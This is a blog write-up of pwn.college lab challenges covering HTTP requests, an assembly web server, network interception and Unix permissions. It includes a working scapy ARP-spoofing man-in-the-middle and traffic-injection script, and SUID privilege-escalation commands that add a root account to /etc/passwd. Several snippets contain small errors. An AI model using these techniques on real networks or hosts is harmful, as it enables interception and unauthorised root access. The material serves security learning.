---
title: pwn.college
date: 2024-09-01 13:58:23
category: pwn
tags:
---

> https://pwn.college

# intro to cybersecurity
## talking-web
### HTTP
HTTP是一个应用层协议

有关会话层的TCP、UDP协议，网络层的IP协议，数据链路层的以太网协议将会在pwn.college的[intercepting-communication](#intercepting-communication)部分中提到

#### HTTP request
下面是HTTP请求的主要结构
```
+-------------+----------------------------+------------------------------------------------+
|format       |GET exapmle                 |POST example                                    |
+-------------+----------------------------+------------------------------------------------+
|request line |GET /get?a=12&b=34 HTTP/1.1 |POST /post HTTP/1.1                             |
|header       |Host: httpbin.org           |Host: httpbin.org                               |
|header       |                            |Content-Type: application/x-www-form-urlencoded |
|header       |                            |Content-Length: 9                               |
|blank line   |                            |                                                |
|request data |                            |a=12&b=34                                       |
+-------------+----------------------------+------------------------------------------------+
```

### Challenges
#### level1
> Send an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80
```

##### nc
```shell
$ nc 127.0.0.1 80
GET / HTTP/1.1
```

##### python
```python
import requests

url = "http://127.0.0.1:80"

response = requests.get(url)

print(response.content)
```

#### level2
> Set the host header in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80 -H host:1c61bf39a9545b12f6fe638081f14f5c
```

##### nc
```shell
$ nc 127.0.0.1 80
GET / HTTP/1.1
Host: c3b1fc17a0766e184c9af77b59799187
```

##### python
```python
import requests

url = "http://127.0.0.1:80"
host = "9caff40ba2b50555593035fa83ddd063"

headers = {
        "host":host
}

response = requests.get(url,headers=headers)

print(response.content)
```

#### level3
> Set the path in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80/756549fa99c1d39df50fa0dbc7001b5b
```

##### nc
```shell
$ nc 127.0.0.1 80
GET /dff70448ab02fa153e53c321d12c3e25 HTTP/1.1
```

##### python
```python
import requests

url = "http://127.0.0.1:80/be21ae3ca3c57337269c87354f7fb58a"

response = requests.get(url)

print(response.content)
```

#### level4
> URL encode a path in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80/468d0524%20a0f46d01/13a2115f%2045f6bf42
```

##### nc
```shell
$ nc 127.0.0.1 80
GET /e834594f%20d12bbc07/45b1bdd9%2077ad1aa4 HTTP/1.1
```

##### python
```python
import requests
from urllib.parse import quote

base_url = "http://127.0.0.1:80"
path = "/e1467bf6 1173372a/0d30c414 6d22c249"
url = base_url + quote(path)

response = requests.get(url)

print(response.content)
```

#### level5
> Specify an argument in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80/?a=21c2593a91c22ea996d92149d6ee1310
```

##### nc
```shell
$ nc 127.0.0.1 80
GET /?a=0c59ad68454000d755026a99dadaa303 HTTP/1.1
```

##### python
```python
import requests
from urllib.parse import urlencode

url = "http://127.0.0.1:80"

a = "1d4f071509297083549435a7d5c7e650"
params = {
    "a":a
}
params = urlencode(params)

response = requests.get(url,params=params)

print(response.content)
```

#### level6
> Specify multiple arguments in an HTTP request
##### curl
```shell
$ curl -v -G --data-urlencode 'a=b40ff87c1dfc9445e66bd1dffd31ecf3' --data-urlencode 'b=e9e53eab 8cccb234&d985bc70#d49f0c63' 127.0.0.1:80
```

##### nc
```shell
$ nc 127.0.0.1 80
GET /?a=01df1fb634dda7a5f27c6c54d072b51d&b=de8950c2%20d91fa17a%2678fc768c%23e848a330 HTTP/1.1
```

##### python
```python
import requests
from urllib.parse import urlencode

url = "http://127.0.0.1:80"
a="7afab61dacb0fca25609fedd696bce30"
b="bb179fab e02b7f2f&3a717740#2fb93639"

params = {
    "a":a,
    "b":b
}
params = urlencode(params)

response = requests.get(url,params=params)

print(response.content)
```

#### level7
> Include form data in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80 -d "a=d59caa292e43dd969de6c0d6adebd053"
```

##### nc
```shell
$ nc 127.0.0.1 80
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

a=0a849ab7d1b57ed2f864880911873622
```

##### python
```python
import requests

url = "http://127.0.0.1:80"
a = 'ab3f0e720c694b54bf8fb2e2c4e6c6f5'
data = {'a':a}

response = requests.post(url,data)

print(response.content)
```

#### level8
> Include form data with multiple fields in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80 -d "a=a4431e83e83cae7723c24b83f465475e" --data-urlencode "b=6100a2f0 e8809d07&587a0ea8#9b1109cd"
```

##### nc
```shell
$ nc 127.0.0.1 80
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

a=b0f2f1b6f49b2896213fb29b3b93a1ef&b=57792821%20bc13e5dc%261426d3c1%23972f7bb8
```

##### python
```python
import requests

url = "http://127.0.0.1:80"
a = '0b39bf04e5ff6e32c942117af11502ef'
b = '3856a81d 06f783f6&494c9950#b7a38f82'
data = {
    'a':a,
    'b':b
}

response = requests.post(url,data)

print(response.content)
```

#### level9
> Include json data in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80 -H 'Content-Type:application/json' -d '{"a":"547135c945b35920ab6b764faba0467c"}'
```

##### nc
```shell
$ nc 127.0.0.1 80
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 40

{"a":"506924275dda4823072f030cb9e36878"}
```

##### python
```python
import requests
import json

url = "http://127.0.0.1:80"
a = 'b152f0359ac06459241c8d57bcf2a8cb'
data = {
    'a':a,
}

headers = {
    'Content-Type':'application/json'
}

response = requests.post(url,headers = headers,data=json.dumps(data))

print(response.content)
```

#### level10
> Include complex json data in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80 -H 'Content-Type:application/json' -d '{"a":"afb674d6a6635008d8f123b6db1c7fe1","b":{"c":"eaa06025","d":["f3e76d78","8897c850 15e64e19&86faa062#707120a5"]}}'
```

##### nc
```shell
$ nc 127.0.0.1 80
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 116

{"a":"e0e3ffb1ea8c041f948fd4a52b8b03ef","b":{"c":"07027b1c","d":["9caee2fb","40d89ef2 c4b79a11&7fa007c8#ccf64a5f"]}}
```

##### python
```python
import requests
import json

url = "http://127.0.0.1:80"
data = {
    "a":"6c924b91dc3acbfe942f9a313d81c607",
    "b":{
        "c":"9b0456d0",
        "d":[
            "96f87ee7",
            "1e81e83f 35de65b4&ecedb67b#29d8d3c2"
        ]
    }
}

headers = {
    'Content-Type':'application/json'
}

response = requests.post(url,headers = headers,data=json.dumps(data))

print(response.content)
```

#### level11
> Follow an HTTP redirect from HTTP response
##### curl
```shell
$ curl 127.0.0.1:80 -L
```
##### nc
```shell
$ nc 127.0.0.1 80
GET / HTTP/1.1

$ nc 127.0.0.1 80
GET /8987117b1c7a13a67e6ebdab1040b023 HTTP/1.1
```

##### python
```python
import requests

url = "127.0.0.1:80"

# 'allow_redirects=true' is default option, can be removed
response = requests.get(url,allow_redirects=true)

print(response.content)
```

#### level12
> Include a cookie from HTTP response
##### curl
```shell
$ curl 127.0.0.1:80 -v

$ curl 127.0.0.1:80 --cookie "cookie=b0a72e415cbb83c7d2671097074329c0"
```

##### nc
```shell
$ nc 127.0.0.1 80
GET / HTTP/1.1

$ nc 127.0.0.1 80
GET / HTTP/1.1
Cookie: cookie=4203ce2d43f46581fe45652da89f9310
```

##### python
```python
import requests

url = "http://127.0.0.1:80"

with requests.Session() as s:
    r = s.get(url)
    print(r.content)

```

#### level13
> Make multiple requests in response to stateful HTTP responses
##### curl
```shell
$ curl 127.0.0.1:80 -v
$ curl 127.0.0.1:80 --cookie "session=eyJzdGF0ZSI6MX0.ZqI1lw.eBOyNFmp0kEvgn4a1KTi6--ZyvE" -v
$ curl 127.0.0.1:80 --cookie "session=eyJzdGF0ZSI6Mn0.ZqI1vA.zPh9QlVY-OvqFsXUk6IvcmafTBU" -v
$ curl 127.0.0.1:80 --cookie "session=eyJzdGF0ZSI6M30.ZqI2AQ.71jPgAYQa35fYtKd79FZU9l2Omg" -v
```

##### nc
```shell
$ nc 127.0.0.1 80
GET / HTTP/1.1

$ nc 127.0.0.1 80
GET / HTTP/1.1
Cookie: session=eyJzdGF0ZSI6MX0.ZqI20w.GYw4a8ICn5uSqs2EPgpS6VPwfmE

$ nc 127.0.0.1 80
GET / HTTP/1.1
Cookie: session=eyJzdGF0ZSI6Mn0.ZqI4EA.ZyJQGgplU-tBR8ZmkGnhwt9-fWE

$ nc 127.0.0.1 80
GET / HTTP/1.1
Cookie: session=eyJzdGF0ZSI6M30.ZqI4NA.G_jGq5vQx6fd2HY3SgqzG95ZXo4
```

##### python
```python
import requests

url = "http://127.0.0.1:80"

with requests.Session() as s:
    r = s.get(url)
    print(r.content)
```

## building-a-web-server
### challenges
这是最终的程序
```X86ASM
.intel_syntax noprefix

.globl _start

.text

#============================================
# function
_start:
    call main
    mov rdi, 0
    mov rax, 60     # SYS_exit
    syscall

#============================================
# function
# [rbp-0x8]     listen_fd
# [rbp-0x10]    accept_fd
# [rbp-0x18]    fork_fd
main:
    push rbp
    mov rbp, rsp
    sub rsp, 0x18

    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41     # SYS_socket
    syscall
    mov [rbp-0x8], rax
    
    mov rdi, [rbp-0x8]
    lea rsi, sockaddr_in
    mov rdx, 16
    mov rax, 49     # SYS_bind
    syscall

    mov rdi, [rbp-0x8]
    xor rsi, rsi
    mov rax, 50     # SYS_listen
    syscall

main_loop:
    mov rdi, [rbp-0x8]
    mov rsi, 0
    mov rdx, 0
    mov rax, 43     # SYS_accept
    syscall
    mov [rbp-0x10], rax

    mov rax, 57     # SYS_fork
    syscall
    mov [rbp-0x18], rax

    cmp rax, 0
    je main_subprocess

    mov rdi, [rbp-0x10]
    mov rax, 3      # SYS_close
    syscall

    jmp main_loop

main_subprocess:
    mov rdi, [rbp-0x8]
    mov rax, 3      # SYS_close
    syscall

    mov rdi, [rbp-0x10]
    call process

    leave
    ret

#============================================
# process(int fd)
# [rbp-0x8]         fd
# [rbp-0x408]       request
# [rbp-0x808]       file_path
# [rbp-0x810]       file_fd
# [rbp-0xc10]       file_data
# [rbp-0xc18]       file_data_len
# [rbp-0xc20]       data_addr
process:
    push rbp
    mov rbp, rsp
    sub rsp, 0xc20
    mov [rbp-0x8], rdi
    mov rdi, [rbp-0x8]
    lea rsi, [rbp-0x408]
    mov rdx, 1024
    mov rax, 0       # SYS_read
    syscall
    lea rdi, [rbp-0x408]
    lea rsi, [rbp-0x808]
    mov rdx, 1024
    call get_path
    mov al, byte ptr [rbp-0x408]
    cmp rax, 'G'
    je process_get
    xor rcx, rcx
    mov al, byte ptr [rbp-0x408]
    cmp rax, 'P'
    je process_post
    jmp process_error
process_get:
    lea rdi, [rbp-0x808]
    mov rsi, 0
    mov rax ,2       # SYS_open
    syscall
    mov [rbp-0x810], rax
    mov rdi, [rbp-0x810]
    lea rsi, [rbp-0xc10]
    mov rdx, 1024
    mov rax, 0       # SYS_read
    syscall
    mov [rbp-0xc18], rax
    mov rdi, [rbp-0x810]
    mov rax, 3      # SYS_close
    syscall
    mov rdi, [rbp-0x8]
    lea rsi, reponse
    mov rdx, 19
    mov rax, 1      # SYS_write
    syscall
    mov rdi, [rbp-0x8]
    lea rsi, [rbp-0xc10]
    mov rdx, [rbp-0xc18]
    mov rax, 1      # SYS_write
    syscall
process_post:
    lea rdx, [rbp-0x408]
    mov eax, dword ptr [rdx+rcx]
    inc rcx
    cmp rax, 0x0a0d0a0d
    jne process_post
    add rcx, 3
    lea rax, [rdx+rcx]
    mov [rbp-0xc20], rax
    lea rdi, [rbp-0x808]
    mov rsi, 65
    mov rdx, 0777
    mov rax, 2    # SYS_open
    syscall
    mov [rbp-0x810], rax
    mov rdi, [rbp-0xc20]
    call strlen
    mov rdx, rax
    mov rdi, [rbp-0x810]
    mov rsi, [rbp-0xc20]
    mov rax, 1      # SYS_write
    syscall
    mov [rbp-0xc18], rax
    mov rdi, [rbp-0x810]
    mov rax, 3      # SYS_close
    syscall
    mov rdi, [rbp-0x8]
    lea rsi, reponse
    mov rdx, 19
    mov rax, 1      # SYS_write
    syscall
process_error:
    leave
    ret

#============================================
# int get_path(char *read_request,char *open_path,size_t len)
get_path:
    push rbp
    mov rbp, rsp
    sub rsp, 0x28

    mov [rbp-0x8], rdi                  # read_request
    mov [rbp-0x10], rsi                 # open_path
    mov [rbp-0x18], rdx                 # len
    mov dword ptr [rbp-0x20], 0         # index_read
    mov dword ptr [rbp-0x28], 0         # index_open

    xor rax, rax

get_path_loop0:
    mov rcx, [rbp-0x20]
    cmp rcx, [rbp-0x18]
    jnb get_path_end
    mov rdx, [rbp-0x8]
    mov al, byte ptr [rdx+rcx]
    inc rcx
    mov [rbp-0x20], rcx
    cmp rax, 0x20
    jne get_path_loop0
get_path_loop1:
    mov rcx, [rbp-0x20]
    cmp rcx, [rbp-0x18]
    jnb get_path_end
    mov rdx, [rbp-0x8]
    mov al, byte ptr [rdx+rcx]
    inc rcx
    mov [rbp-0x20], rcx
    cmp rax, 0x20
    je get_path_end
    mov rcx, [rbp-0x28]
    mov rdx, [rbp-0x10]
    mov byte ptr [rdx+rcx], al
    inc rcx
    mov [rbp-0x28], rcx
    jmp get_path_loop1
get_path_end:    
    mov rdx, [rbp-0x10]
    add rdx, [rbp-0x28]
    mov byte ptr [rdx], 0
    mov rax, [rbp-0x20]
    leave
    ret

#============================================
# size_t strlen(char *src)
strlen:
    push rbp
    mov rbp, rsp
    xor rax, rax
    xor rdx, rdx
strlen_loop:
    mov dl, byte ptr [rdi+rax]
    inc rax
    cmp rdx, 0
    jne strlen_loop
    sub rax, 1
    leave
    ret

#============================================

.data
sockaddr_in:
	.short 2        # sin_family
	.short 0x5000   # sin_port
    .long 0         # sin_addr
    .rept 8
    .byte 0
    .endr

reponse:
    .string "HTTP/1.0 200 OK\r\n\r\n"

```

## intercepting-communication
### challenges
In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.

#### level1
> Connect to a remote host
```shell
$ nc 10.0.0.3 31337
```

#### level2
> Listen for a connection from a remote host
```shell
$ nc -l -p 31337
```

#### level3
> Find and connect to a remote host

```shell
The remote host is somewhere on the `10.0.0.0/24` subnetwork, listening on port `31337`.

$ nmap -v 10.0.0.0/24 -p 31337
```

#### level4
> Find and connect to a remote host on a large network

```shell
The remote host is somewhere on the `10.0.0.0/16` subnetwork, listening on port `31337`.

$ nmap -v 10.0.0.0/16 -p 31337 -T5

65536 IP addresses (2 hosts up) scanned in 2612.03 seconds
```

#### level5
> Monitor traffic from a remote host

In this challenge you will monitor traffic from a remote host.
Your host is already receiving traffic on port `31337`.

```shell
$ tcpdump -A
```

#### level6
> Monitor slow traffic from a remote host

In this challenge you will monitor slow traffic from a remote host.
Your host is already receiving traffic on port `31337`.

```shell
$ tcpdump -Q in "tcp[tcpflags]&tcp-push!=0" -X -q -l | grep 0x0030
```

or you can use wireshark


#### level7
> Hijack traffic from a remote host by configuring your network interface

In this challenge you will hijack traffic from a remote host by configuring your network interface.
The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.2` on port `31337`.

```shell
$ ip addr add 10.0.0.2/16 dev eth0

$ nc -l 31337
```

#### level8
> Manually send an Ethernet packet

In this challenge you will manually send an Ethernet packet.
The packet should have `Ether type=0xFFFF`.
The packet should be sent to the remote host at `10.0.0.3`.

```python
$ scpay

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'06:3f:d7:4f:63:40'
>>> pk=Ether(src="06:3f:d7:4f:63:40",dst="ff:ff:ff:ff:ff:ff",type=0xFFFF)
>>> srp(pk,iface="eth0")
```

#### level9
> Manually send an Internet Protocol packet

In this challenge you will manually send an Internet Protocol packet.
The packet should have `IP proto=0xFF`.
The packet should be sent to the remote host at `10.0.0.3`.

```python
$ scapy

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'd6:8e:5a:63:78:a2'
>>> pk=Ether(src="d6:8e:5a:63:78:a2",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3",proto=0xff)
>>> srp(pk1)
```

#### level10
> Manually send a Transmission Control Protocol packet

In this challenge you will manually send a Transmission Control Protocol packet.
The packet should have `TCP sport=31337, dport=31337, seq=31337, ack=31337, flags=APRSF`.
The packet should be sent to the remote host at `10.0.0.3`.

```python
$ scapy

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'96:14:00:18:e9:96'
>>> pk=Ether(src="96:14:00:18:e9:96",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337,dport=31337,seq=31337,ack=31337,flags='APRSF')
>>> srp(pk,iface='eth0')
```

#### level11
> Manually perform a Transmission Control Protocol handshake

In this challenge you will manually perform a Transmission Control Protocol handshake.
The initial packet should have `TCP sport=31337, dport=31337, seq=31337`.
The handshake should occur with the remote host at `10.0.0.3`.

```python
$ scapy

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'42:f4:f8:57:fa:a4'
>>> pk1=Ether(src="42:f4:f8:57:fa:a4",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337,dport=31337,seq=31337,flags='S')
>>> response=srp(pk1,iface='eth0')
>>> response[0][0]
QueryAnswer(query=<Ether  dst=ff:ff:ff:ff:ff:ff src=42:f4:f8:57:fa:a4 type=IPv4 |<IP  frag=0 proto=6 src=10.0.0.2 dst=10.0.0.3 |<TCP  sport=31337 dport=31337 seq=31337 flags=S |>>>, answer=<Ether  dst=42:f4:f8:57:fa:a4 src=be:9b:98:0e:32:27 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=40 id=1 flags= frag=0 ttl=64 proto=6 chksum=0x66cb src=10.0.0.3 dst=10.0.0.2 |<TCP  sport=31337 dport=31337 seq=3424417206 ack=31338 dataofs=5 reserved=0 flags=SA window=8192 chksum=0xcabd urgptr=0 |>>>)
>>> pk2=Ether(src="42:f4:f8:57:fa:a4",dst="be:9b:98:0e:32:27")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337,dport=31337,seq=31338,ack=3424417207,flags='A')
>>> response1=srp(pk2,iface='eth0')

```

#### level12
> Manually send an Address Resolution Protocol packet

In this challenge you will manually send an Address Resolution Protocol packet.
The packet should have `ARP op=is-at` and correctly inform the remote host of where the sender can be found.
The packet should be sent to the remote host at `10.0.0.3`.

```python
$ scapy

>>> get_if_hwaddr("eth0")
'5e:76:a7:a8:dc:75'
>>> pk=Ether(src="5e:76:a7:a8:dc:75",dst="ff:ff:ff:ff:ff:ff")/ARP(op="is-at",hwsrc="5e:76:a7:a8:dc:75",psrc="10.0.0.2")
>>> srp(pk,iface='eth0')
```

#### level13
> Hijack traffic from a remote host using ARP

In this challenge you will hijack traffic from a remote host using ARP.
You do not have the capabilities of a NET ADMIN.
The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.2` on port `31337`.

```python
>>> get_if_hwaddr("eth0")
'8e:4b:78:5c:3c:6a'
>>> pk=Ether(src="8e:4b:78:5c:3c:6a",dst="ff:ff:ff:ff:ff:ff")/ARP(op="is-at",hwsrc="8e:4b:78:5c:3c:6a",psrc="10.0.0.2",pdst="10.0.0.4")
>>> sendp(pk,iface="eth0")
>>> sniff(iface='eth0',filter='tcp[tcpflags]&tcp-push!=0',prn=hexdump) 

```

#### level14
> Man-in-the-middle traffic between two remote hosts and inject extra traffic

In this challenge you will man in the middle traffic between two remote hosts and inject extra traffic.
The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.3` on port `31337`.

```python
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

interface = "eth0"
local_mac = get_if_hwaddr(interface)
local_ip = "10.0.0.2"
ip1 = "10.0.0.3"
ip2 = "10.0.0.4"

mac1=getmacbyip(ip=ip1)
mac2=getmacbyip(ip=ip2)

print(f"\033[1;32mlocal_mac:{local_mac}\033[0m")
print(f"\033[1;32mmac1:{mac1}\033[0m")
print(f"\033[1;32mmac2:{mac2}\033[0m")

eth=Ether(src=local_mac,dst="ff:ff:ff:ff:ff:ff")
arp1=ARP(op="is-at",hwsrc=local_mac,psrc=ip1,pdst=ip2)
arp2=ARP(op="is-at",hwsrc=local_mac,psrc=ip2,pdst=ip1)
sendp(eth/arp1,iface=interface)
sendp(eth/arp2,iface=interface)

def process(p:Packet):
    try:
        print("load:",p['TCP'].load)
        if p['TCP'].load==b"COMMANDS:\nECHO\nFLAG\nCOMMAND:\n":
            pdst = p['IP'].src
            psrc = p['IP'].dst
            flags = 'PA'
            ipflags = p['IP'].flags
            dst = p['Ethernet'].src
            dport = p['TCP'].sport
            sport = p['TCP'].dport
            seq = p['TCP'].ack
            ack = p['TCP'].seq+24
            pk = Ether(src=local_mac,dst=dst)/IP(src=psrc,dst=pdst,flags=ipflags)/TCP(sport=sport,dport=dport,seq=seq,ack=ack,flags=flags)/Raw(load=b"FLAG")
            sendp(pk,iface=interface)
    except Exception:
        pass
    
sniff(iface=interface,filter="tcp",prn=process)
```

## access-control
### suid提权
#### 查找suid权限文件
```shell
$ find / -perm -u=s -type f 2>/dev/null
```

#### 常用命令提权方法
##### cp
```shell
$ cat /etc/passwd > passwd
$ openssl passwd -1 -salt z hack # 生成在passwd文件中hack密码对应的加密后口令
$ echo "hack:$1$z$eN1X4Y0BpzcYM5USaVCR.0:0:0::/root:/bin/shell" >> passwd # 生成一个新用户hack，其登录口令为hack
$ cp passwd /etc/passwd
$ su - hack
```

### challenge
In this series of challenges, you will be working with various access control systems.
Break the system to get the flag.

#### level1
> Flag owned by you with different permissions

```shell
In this challenge you will work with different UNIX permissions on the flag.
The flag file will be owned by you and have 400 permissions.

Before:
-r-------- 1 root root 58 Sep  1 07:26 /flag
After:
-r-------- 1 hacker root 58 Sep  1 07:26 /flag

$ cat /flag
```

#### level2
> Flag owned by you with different permissions

```shell
In this challenge you will work with different UNIX permissions on the flag.
The flag file will be owned by root, group as you, and have 040 permissions.

Before:
-r-------- 1 root root 58 Sep  1 07:27 /flag
After:
----r----- 1 root hacker 58 Sep  1 07:27 /flag

$ cat /flag
```

#### level3
> Flag owned by you with different permissions

```shell
In this challenge you will work with different UNIX permissions on the flag.
The flag file will be owned by you and have 000 permissions.

Before:
-r-------- 1 root root 58 Sep  1 07:36 /flag
After:
---------- 1 hacker root 58 Sep  1 07:36 /flag

$ chmod 777 /flag
$ cat /flag
```

#### level4
> How does SETUID work?

```shell
In this challenge you will work understand how the SETUID bit for UNIX permissions works.
What if /bin/cat had the SETUID bit set?

Before:
-rwxr-xr-x 1 root root 43416 Sep  5  2019 /bin/cat
After:
-rwsr-xr-x 1 root root 43416 Sep  5  2019 /bin/cat

$ cat /flag
```

#### level5
> How does SETUID and cp work?

```shell
In this challenge you will work understand how the SETUID bit for UNIX permissions works.
What if /bin/cp had the SETUID bit set?
Hint: Look into how cp will deal with different permissions.
Another Hint: check the man page for cp, any options in there that might help?

Before:
-rwxr-xr-x 1 root root 153976 Sep  5  2019 /bin/cp
After:
-rwsr-xr-x 1 root root 153976 Sep  5  2019 /bin/cp

$ cat /etc/passwd > passwd
$ openssl passwd -1 -salt z hack
$ echo "hack:$1$z$eN1X4Y0BpzcYM5USaVCR.0:0:0::/root:/bin/shell" >> passwd
$ cp passwd /etc/passwd
$ su - hack
$ cat /flag
```

#### level6
> Flag owned by a different group

```shell
In this challenge you will work with different UNIX permissions on the flag.
The flag file is owned by root and a new group.
Hint: Search for how to join a group with a password.

Before:
-r-------- 1 root root 58 Sep  1 07:16 /flag
After:
----r----- 1 root group_yjtqrzub 58 Sep  1 07:16 /flag
The password for group_yjtqrzub is: swxryfxa

$ newgrp group_yjtqrzub # 输入密码 swxryfxa
$ groups
$ cat /flag
```

#### level7
> Flag owned by you with different permissions, multiple users

```shell
In this challenge you will work understand how UNIX permissions works with multiple users.
You'll also be given access to various user accounts, use su to switch between them.

Before:
-r-------- 1 root root 58 Sep  1 07:38 /flag
Created user user_iiwybckt with password ghvxdqze
After:
-------r-- 1 hacker root 58 Sep  1 07:38 /flag

$ su user_iiwybckt # 输入密码 ghvxdqze
$ cat /flag

# or

$ chmod 777 /flag
$ cat /flag
```

#### level8
> Flag owned by other users

```shell
In this challenge you will work understand how UNIX permissions works with multiple users.
You'll also be given access to various user accounts, use su to switch between them.

Before:
-r-------- 1 root root 58 Sep  1 07:39 /flag
Created user user_rhxpgtwj with password tyfbecia
After:
-r-------- 1 user_rhxpgtwj root 58 Sep  1 07:39 /flag

$ su user_rhxpgtwj # 输入密码 tyfbecia
$ cat /flag
```

#### level9
> Flag owned by other users

```shell
In this challenge you will work understand how UNIX permissions works with multiple users.
You'll also be given access to various user accounts, use su to switch between them.

Before:
-r-------- 1 root root 58 Sep  1 07:42 /flag
Created user user_cazgcldr with password kifrychf
After:
----r----- 1 root user_cazgcldr 58 Sep  1 07:42 /flag

$ su user_cazgcldr # 输入密码 kifrychf
$ cat /flag
```

#### level10
> Flag owned by a group

```shell
In this challenge you will work understand how UNIX permissions works with multiple users.
You'll also be given access to various user accounts, use su to switch between them.
Hint: How can you tell which user is in what group?

Before:
-r-------- 1 root root 58 Sep  1 07:43 /flag
Created user user_vcrwcfed with password mooryvsi
Created user user_nupwlgln with password snmihyet
Created user user_xocpstyf with password wvmxkawk
Created user user_jodemick with password wkfiqzmw
Created user user_jfhyfzcm with password cbrrtkhw
Created user user_jlvxtelf with password ezprzexf
Created user user_dkajakjt with password prdldnkc
Created user user_hlkosnol with password fbrushep
Created user user_qsamltgz with password yaknjraz
Created user user_gyrkocsy with password fskyzktv
After:
----r----- 1 root group_nkp 58 Sep  1 07:43 /flag

$ cat /etc/group
$ su xxx
$ cat /flag
```

#### level11
> Find the flag using multiple users

```shell
In this challenge you will work understand how UNIX permissions for directories work with multiple users.
You'll be given access to various user accounts, use su to switch between them.

Created user user_betcpnye with password dkhiqvyi
Created user user_qydwicsg with password gnaoedja
A copy of the flag has been placed somewhere in /tmp:
total 40
drwxrwxrwt 1 root   root          4096 Sep  1 07:45 .
drwxr-xr-x 1 root   root          4096 Sep  1 07:45 ..
-rw-rw-r-- 1 root   root             4 Aug  5 23:25 .cc.txt
-rw-r--r-- 1 root   root            55 Sep  1 01:16 .crates.toml
-rw-r--r-- 1 root   root           453 Sep  1 01:16 .crates2.json
drwxr-xr-x 2 hacker hacker        4096 Sep  1 07:45 .dojo
drwxr-xr-x 2 root   root          4096 Sep  1 01:16 bin
drwxr-xr-x 1 root   root          4096 Aug  5 23:22 hsperfdata_root
drwx------ 2    104           105 4096 Aug 27 04:47 tmp.gzrsgdiMSN
dr-xr-x--x 2 root   user_betcpnye 4096 Sep  1 07:45 tmpr_j9uk3r

$ su user_betcpnye
$ cd /tmp/tmpr_j9uk3r
$ ls
$ su user_qydwicsg
$ cat /tmp/tmpr_j9uk3r/xxx
```

#### level12
> Find the flag using multiple users

```shell
In this challenge you will work understand how UNIX permissions for directories work with multiple users.
You'll be given access to various user accounts, use su to switch between them.

Created user user_wavnhyls with password jnfksrwp
Created user user_ocqiyufq with password vmljvdoc
Created user user_npddlxea with password rtdytofy
A copy of the flag has been placed somewhere in /tmp:
total 40
drwxrwxrwt 1 root   root          4096 Sep  1 07:48 .
drwxr-xr-x 1 root   root          4096 Sep  1 07:47 ..
-rw-rw-r-- 1 root   root             4 Aug  5 23:25 .cc.txt
-rw-r--r-- 1 root   root            55 Sep  1 01:16 .crates.toml
-rw-r--r-- 1 root   root           453 Sep  1 01:16 .crates2.json
drwxr-xr-x 2 hacker hacker        4096 Sep  1 07:47 .dojo
drwxr-xr-x 2 root   root          4096 Sep  1 01:16 bin
drwxr-xr-x 1 root   root          4096 Aug  5 23:22 hsperfdata_root
drwx------ 2    104           105 4096 Aug 27 04:47 tmp.gzrsgdiMSN
dr-xr-x--x 3 root   user_wavnhyls 4096 Sep  1 07:48 tmp9wu15dcc

$ su user_wavnhyls
$ cd /tmp/tmp9wu15dcc
$ ls
$ su xxx-2
$ cd /tmp/tmpxxx/tmpxxx
$ ls
$ su xxx-3
$ cat /tmp/tmpxxx/tmpxxx/xxx 
```

#### level13
> One Mandatory Access Control question without categories

```shell
In this challenge you'll be answering questions about the standard Bell–LaPadula model of Mandatory Access Control.

Answer the question about the model to get the flag.


In this challenge, your goal is to answer 1 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:
4 Levels (first is highest aka more sensitive):
TS
S
C
UC
Q 1. Can a Subject with level UC read an Object with level UC?
yes
Correct!
Congratulations, you solved this challenge!

```

#### level14
> Five Mandatory Access Control questions without categories

```shell
In this series of challenges, you will be working with various access control systems.
Break the system to get the flag.


In this challenge you'll be answering questions about the standard Bell–LaPadula model of Mandatory Access Control.

Answer the questions about the model to get the flag.


In this challenge, your goal is to answer 5 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:
4 Levels (first is highest aka more sensitive):
TS
S
C
UC
Q 1. Can a Subject with level S write an Object with level S?
yes
Correct!
Q 2. Can a Subject with level S read an Object with level UC?
yes
Correct!
Q 3. Can a Subject with level C write an Object with level S?
yes
Correct!
Q 4. Can a Subject with level S write an Object with level TS?
yes
Correct!
Q 5. Can a Subject with level TS read an Object with level TS?
yes
Correct!
Congratulations, you solved this challenge!

```

#### level15
> One Mandatory Access Control question with categories

```shell
In this challenge you'll be answering questions about the category-based Bell–LaPadula model of Mandatory Access Control.

Answer the question about the model to get the flag.


In this challenge, your goal is to answer 1 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:
4 Levels (first is highest aka more sensitive):
TS
S
C
UC
4 Categories:
NUC
NATO
UFO
ACE
Q 1. Can a Subject with level UC and categories {UFO} read an Object with level UC and categories {NATO, UFO, ACE}?
no
Correct!
Congratulations, you solved this challenge!
```

#### level16
